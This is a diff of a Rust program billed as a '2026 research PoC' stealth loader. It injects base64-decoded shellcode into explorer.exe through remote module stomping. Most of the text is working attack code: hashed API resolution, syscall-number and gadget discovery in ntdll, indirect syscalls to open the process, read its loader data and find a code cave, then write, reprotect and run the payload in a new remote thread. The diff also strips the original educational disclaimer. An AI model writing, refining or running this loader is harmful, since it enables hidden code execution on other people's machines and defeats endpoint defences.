@@ -6,20 +6,12 @@ use std::ffi::{c_void, CStr};
 use std::ptr::null_mut;
 use base64::{Engine as _, engine::general_purpose};
 use windows_sys::Win32::System::Memory::*;
-use windows_sys::Win32::System::Threading::INFINITE;
 use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    ADVANCED 2026 RESEARCH PoC: REMOTE MODULE STOMPING & INDIRECT SYSCALLS
+    FINAL 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
     ================================================================================
-
-    This implementation targets explorer.exe and utilizes modern stealth techniques:
-    - Remote PEB Walking via Indirect Syscalls (NtReadVirtualMemory).
-    - Remote Code Cave Discovery (Module Stomping) in non-vital DLLs.
-    - Full Indirect Syscall coverage for all sensitive operations.
-
-    Disclaimer: For educational research on Windows Internals only.
 */
 
 // --- Manual PE & System Structure Definitions ---
@@ -42,93 +34,24 @@ use windows_sys::Win32::Foundation::*;
 #[repr(C)] pub struct SYSTEM_PROCESS_INFORMATION { pub NextEntryOffset: u32, pub NumberOfThreads: u32, pub WorkingSetPrivateSize: i64, pub HardFaultCount: u32, pub NumberOfThreadsHighWatermark: u32, pub CycleTime: u64, pub CreateTime: i64, pub UserTime: i64, pub KernelTime: i64, pub ImageName: UNICODE_STRING, pub BasePriority: i32, pub UniqueProcessId: HANDLE, pub InheritedFromUniqueProcessId: HANDLE }
 #[repr(C)] pub struct PROCESS_BASIC_INFORMATION { pub ExitStatus: i32, pub PebBaseAddress: *mut PEB, pub AffinityMask: usize, pub BasePriority: i32, pub UniqueProcessId: usize, pub InheritedFromUniqueProcessId: usize }
 
-// --- Utilities ---
-
-fn dbj2_hash(s: &str) -> u32 {
-    let mut hash: u32 = 5381;
-    for c in s.bytes() { hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32); }
-    hash
-}
-
-unsafe fn get_local_module(hash: u32) -> Option<*mut c_void> {
-    #[cfg(target_arch = "x86_64")]
-    let peb: *const PEB;
-    #[cfg(target_arch = "x86_64")]
-    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-    #[cfg(not(target_arch = "x86_64"))] return None;
-
-    let ldr = (*peb).Ldr;
-    let head = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
-    let mut curr = (*ldr).InLoadOrderModuleList.Flink;
-    while curr != head {
-        let entry = curr as *const LDR_DATA_TABLE_ENTRY;
-        let buf = (*entry).BaseDllName.Buffer;
-        if !buf.is_null() {
-            let name = String::from_utf16_lossy(std::slice::from_raw_parts(buf, ((*entry).BaseDllName.Length / 2) as usize)).to_lowercase();
-            if dbj2_hash(&name) == hash { return Some((*entry).DllBase); }
-        }
-        curr = (*curr).Flink;
-    }
-    None
-}
-
-unsafe fn resolve_ssn(ntdll: *mut c_void, hash: u32) -> Option<u32> {
-    let base = ntdll as usize;
-    let dos = base as *const IMAGE_DOS_HEADER;
-    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-    let exp_dir_va = (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
-    let exp_dir = (base + exp_dir_va) as *const IMAGE_EXPORT_DIRECTORY;
-    let names = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNames as usize) as *const u32, (*exp_dir).NumberOfNames as usize);
-    let funcs = std::slice::from_raw_parts((base + (*exp_dir).AddressOfFunctions as usize) as *const u32, (*exp_dir).NumberOfFunctions as usize);
-    let ords = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNameOrdinals as usize) as *const u16, (*exp_dir).NumberOfNames as usize);
-
-    for i in 0..(*exp_dir).NumberOfNames as usize {
-        if let Ok(name) = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str() {
-            if dbj2_hash(name) == hash {
-                let ord = ords[i] as usize;
-                let ptr = (base + funcs[ord] as usize) as *const u8;
-                if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 { return Some(*(ptr.add(4) as *const u32)); }
-                for j in 1..32 {
-                    if ord >= j {
-                        let up = (base + funcs[ord - j] as usize) as *const u8;
-                        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 { return Some((*(up.add(4) as *const u32)).wrapping_add(j as u32)); }
-                    }
-                    if ord + j < (*exp_dir).NumberOfFunctions as usize {
-                        let down = (base + funcs[ord + j] as usize) as *const u8;
-                        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 { return Some((*(down.add(4) as *const u32)).wrapping_sub(j as u32)); }
-                    }
-                }
-            }
-        }
-    }
-    None
-}
-
-unsafe fn find_gadget(ntdll: *mut c_void) -> Option<usize> {
-    let base = ntdll as usize;
-    let dos = base as *const IMAGE_DOS_HEADER;
-    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-    let secs = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
-    for i in 0..(*nt).FileHeader.NumberOfSections {
-        let sec = secs.add(i as usize);
-        if (*sec).Name[0] == b'.' && (*sec).Name[1] == b't' {
-            let start = base + (*sec).VirtualAddress as usize;
-            let slice = std::slice::from_raw_parts(start as *const u8, (*sec).Misc.VirtualSize as usize);
-            for j in 0..slice.len() - 3 { if slice[j] == 0x0F && slice[j+1] == 0x05 && slice[j+2] == 0xC3 { return Some(start + j); } }
-        }
-    }
-    None
-}
+// --- Indirect Syscall Logic ---
 
 #[inline(always)]
 unsafe fn sys_call(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> NTSTATUS {
     let mut status: i32;
     #[cfg(target_arch = "x86_64")]
     std::arch::asm!(
-        "mov r10, rcx", "sub rsp, 0x60",
-        "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}", "mov [rsp + 0x38], {a8}",
-        "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}", "mov [rsp + 0x50], {a11}",
-        "call {gadget}", "add rsp, 0x60",
+        "mov r10, rcx",
+        "sub rsp, 0x68",
+        "mov [rsp + 0x20], {a5}",
+        "mov [rsp + 0x28], {a6}",
+        "mov [rsp + 0x30], {a7}",
+        "mov [rsp + 0x38], {a8}",
+        "mov [rsp + 0x40], {a9}",
+        "mov [rsp + 0x48], {a10}",
+        "mov [rsp + 0x50], {a11}",
+        "call {gadget}",
+        "add rsp, 0x68",
         a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8, a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11,
         gadget = in(reg) gadget, in("rcx") a1, in("rdx") a2, in("r8") a3, in("r9") a4, in("eax") ssn, lateout("rax") status, out("r11") _, out("r10") _,
     );
@@ -136,94 +59,135 @@ unsafe fn sys_call(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4:
     status
 }
 
-// --- Main Program ---
+fn dbj2(s: &str) -> u32 {
+    let mut h: u32 = 5381;
+    for c in s.bytes() { h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32); }
+    h
+}
+
+unsafe fn get_local_module(h: u32) -> Option<*mut c_void> {
+    #[cfg(target_arch = "x86_64")]
+    let peb: *const PEB;
+    #[cfg(target_arch = "x86_64")]
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    let ldr = (*peb).Ldr;
+    let mut curr = (*ldr).InLoadOrderModuleList.Flink;
+    while curr != (&mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY) {
+        let entry = curr as *const LDR_DATA_TABLE_ENTRY;
+        if !(*entry).BaseDllName.Buffer.is_null() {
+            let name = String::from_utf16_lossy(std::slice::from_raw_parts((*entry).BaseDllName.Buffer, ((*entry).BaseDllName.Length / 2) as usize)).to_lowercase();
+            if dbj2(&name) == h { return Some((*entry).DllBase); }
+        }
+        curr = (*curr).Flink;
+    }
+    None
+}
+
+unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)> {
+    let base = ntdll as usize;
+    let dos = base as *const IMAGE_DOS_HEADER;
+    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+    let exp_dir_va = (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
+    let exp_dir = (base + exp_dir_va) as *const IMAGE_EXPORT_DIRECTORY;
+    let names = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNames as usize) as *const u32, (*exp_dir).NumberOfNames as usize);
+    let functions = std::slice::from_raw_parts((base + (*exp_dir).AddressOfFunctions as usize) as *const u32, (*exp_dir).NumberOfFunctions as usize);
+    let ords = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNameOrdinals as usize) as *const u16, (*exp_dir).NumberOfNames as usize);
+
+    for i in 0..(*exp_dir).NumberOfNames as usize {
+        let name = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str().ok()?;
+        if dbj2(name) == h {
+            let ord = ords[i] as usize;
+            let ptr = (base + functions[ord] as usize) as *const u8;
+            let mut gadget = 0usize;
+            for j in 0..500 { if *ptr.add(j) == 0x0F && *ptr.add(j+1) == 0x05 && *ptr.add(j+2) == 0xC3 { gadget = ptr.add(j) as usize; break; } }
+            if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 { return Some((*(ptr.add(4) as *const u32), gadget)); }
+            for j in 1..32 {
+                if ord >= j {
+                    let up = (base + functions[ord - j] as usize) as *const u8;
+                    if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 { return Some(((*(up.add(4) as *const u32)).wrapping_add(j as u32), gadget)); }
+                }
+                if ord + j < (*exp_dir).NumberOfFunctions as usize {
+                    let down = (base + functions[ord + j] as usize) as *const u8;
+                    if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 { return Some(((*(down.add(4) as *const u32)).wrapping_sub(j as u32), gadget)); }
+                }
+            }
+        }
+    }
+    None
+}
+
+// --- Main Execution ---
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("[*] 2026 Stealth Remote Loader - Advanced Module Stomping");
+    println!("[*] Final 2026 Stealth Loader Refined PoC");
     let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
     unsafe {
-        let ntdll = get_local_module(dbj2_hash("ntdll.dll")).expect("[-] ntdll failed");
-        let gadget = find_gadget(ntdll).expect("[-] gadget failed");
+        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll failed");
+        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("open ssn failed");
+        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("read ssn failed");
+        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("write ssn failed");
+        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("protect ssn failed");
+        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("thread ssn failed");
+        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("query ssn failed");
+        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("proc ssn failed");
 
-        let ssn_query = resolve_ssn(ntdll, dbj2_hash("NtQuerySystemInformation")).unwrap();
-        let ssn_open = resolve_ssn(ntdll, dbj2_hash("NtOpenProcess")).unwrap();
-        let ssn_read = resolve_ssn(ntdll, dbj2_hash("NtReadVirtualMemory")).unwrap();
-        let ssn_write = resolve_ssn(ntdll, dbj2_hash("NtWriteVirtualMemory")).unwrap();
-        let ssn_protect = resolve_ssn(ntdll, dbj2_hash("NtProtectVirtualMemory")).unwrap();
-        let ssn_thread = resolve_ssn(ntdll, dbj2_hash("NtCreateThreadEx")).unwrap();
-        let ssn_proc_info = resolve_ssn(ntdll, dbj2_hash("NtQueryInformationProcess")).unwrap();
-
-        // 1. Locate Explorer.exe
         let mut buffer = vec![0u8; 1024 * 1024];
         let mut len = 0u32;
         sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
-        let mut explorer_pid: HANDLE = null_mut();
+        let mut exp_pid: HANDLE = null_mut();
         let mut offset = 0;
         loop {
             let info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
             if !(*info).ImageName.Buffer.is_null() {
                 let name = String::from_utf16_lossy(std::slice::from_raw_parts((*info).ImageName.Buffer, ((*info).ImageName.Length / 2) as usize));
-                if name.to_lowercase() == "explorer.exe" { explorer_pid = (*info).UniqueProcessId; break; }
+                if name.to_lowercase() == "explorer.exe" { exp_pid = (*info).UniqueProcessId; break; }
             }
             if (*info).NextEntryOffset == 0 { break; }
             offset += (*info).NextEntryOffset as usize;
         }
-        if explorer_pid.is_null() { return Err("explorer.exe not found".into()); }
-        println!("[+] Target Process found: explorer.exe (PID: {})", explorer_pid as usize);
+        if exp_pid.is_null() { return Err("explorer.exe not found".into()); }
 
-        // 2. Open Handle
         let mut h_proc: HANDLE = null_mut();
         let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
-        let mut cid = CLIENT_ID { UniqueProcess: explorer_pid, UniqueThread: null_mut() };
+        let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
         sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
-        if h_proc.is_null() { return Err("Failed to open explorer".into()); }
+        if h_proc.is_null() { return Err("open failed".into()); }
 
-        // 3. Remote Module Cave Discovery
         let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
-        sys_call(ssn_proc_info, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
-
+        sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
         let mut peb_copy: PEB = std::mem::zeroed();
         sys_call(ssn_read, gadget, h_proc as usize, pbi.PebBaseAddress as usize, &mut peb_copy as *mut _ as usize, std::mem::size_of::<PEB>(), 0, 0, 0, 0, 0, 0, 0);
-
         let mut ldr_copy: PEB_LDR_DATA = std::mem::zeroed();
         sys_call(ssn_read, gadget, h_proc as usize, peb_copy.Ldr as usize, &mut ldr_copy as *mut _ as usize, std::mem::size_of::<PEB_LDR_DATA>(), 0, 0, 0, 0, 0, 0, 0);
 
-        let mut current_link = ldr_copy.InLoadOrderModuleList.Flink;
+        let mut curr_link = ldr_copy.InLoadOrderModuleList.Flink;
         let mut cave_addr = 0usize;
-
-        println!("[*] Searching for remote Module Stomping candidate...");
-        while current_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY {
+        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY {
             let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
-            sys_call(ssn_read, gadget, h_proc as usize, current_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
-
-            let mut name_buf = vec![0u16; (entry.BaseDllName.Length / 2) as usize];
-            sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, name_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
-            let name = String::from_utf16_lossy(&name_buf).to_lowercase();
+            sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
+            let mut n_buf = vec![0u16; (entry.BaseDllName.Length / 2) as usize];
+            sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
+            let name = String::from_utf16_lossy(&n_buf).to_lowercase();
 
             if !name.contains("ntdll") && !name.contains("kernel") {
-                let base = entry.DllBase as usize;
                 let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
-                sys_call(ssn_read, gadget, h_proc as usize, base, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-
+                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
                 let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
-                sys_call(ssn_read, gadget, h_proc as usize, base + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
-
-                let sections_addr = base + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
+                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
+                let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
                 for i in 0..nt.FileHeader.NumberOfSections {
-                    let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                    sys_call(ssn_read, gadget, h_proc as usize, sections_addr + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut sec as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-
-                    if sec.Name[0] == b'.' && sec.Name[1] == b't' {
-                        let start = base + sec.VirtualAddress as usize;
-                        let size = sec.Misc.VirtualSize as usize;
-                        let mut temp_buf = vec![0u8; size];
-                        sys_call(ssn_read, gadget, h_proc as usize, start, temp_buf.as_mut_ptr() as usize, size, 0, 0, 0, 0, 0, 0, 0);
-
+                    let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
+                    sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
+                    if s.Name[0] == b'.' && s.Name[1] == b't' {
+                        let start = entry.DllBase as usize + s.VirtualAddress as usize;
+                        let size = s.Misc.VirtualSize as usize;
+                        let mut t_buf = vec![0u8; size];
+                        sys_call(ssn_read, gadget, h_proc as usize, start, t_buf.as_mut_ptr() as usize, size, 0, 0, 0, 0, 0, 0, 0);
                         let mut count = 0;
                         for j in (0..size).rev() {
-                            if temp_buf[j] == 0x00 || temp_buf[j] == 0xCC { count += 1; } else { count = 0; }
+                            if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
                             if count >= shellcode.len() { cave_addr = start + j; break; }
                         }
                     }
@@ -231,13 +195,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 }
             }
             if cave_addr != 0 { break; }
-            current_link = entry.InLoadOrderLinks.Flink;
+            curr_link = entry.InLoadOrderLinks.Flink;
         }
+        if cave_addr == 0 { return Err("cave failed".into()); }
+        println!("[+] Target cave: 0x{:x}", cave_addr);
 
-        if cave_addr == 0 { return Err("No suitable remote cave found".into()); }
-        println!("[+] Remote Code Cave Found: 0x{:x}", cave_addr);
-
-        // 4. Remote Execution
         let mut base = cave_addr as *mut c_void;
         let mut sz = shellcode.len();
         let mut old = 0u32;
@@ -245,11 +207,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         sys_call(ssn_write, gadget, h_proc as usize, cave_addr, shellcode.as_ptr() as usize, shellcode.len(), 0, 0, 0, 0, 0, 0, 0);
         sys_call(ssn_protect, gadget, h_proc as usize, &mut base as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);
 
-        let mut h_thread: HANDLE = null_mut();
-        sys_call(ssn_thread, gadget, &mut h_thread as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
-        if !h_thread.is_null() {
-            println!("[+] Professional 2026 Stealth Remote Success.");
-            windows_sys::Win32::System::Threading::WaitForSingleObject(h_thread, INFINITE);
+        let mut h_th: HANDLE = null_mut();
+        sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
+        if !h_th.is_null() {
+            println!("[+] Success.");
+            windows_sys::Win32::System::Threading::WaitForSingleObject(h_th, 0xFFFFFFFF);
         }
     }
     Ok(())
@@ -258,5 +220,5 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    #[test] fn test_hash() { assert_eq!(dbj2_hash("ntdll.dll"), dbj2_hash("ntdll.dll")); }
+    #[test] fn test_h() { assert_eq!(dbj2("ntdll.dll"), dbj2("ntdll.dll")); }
 }
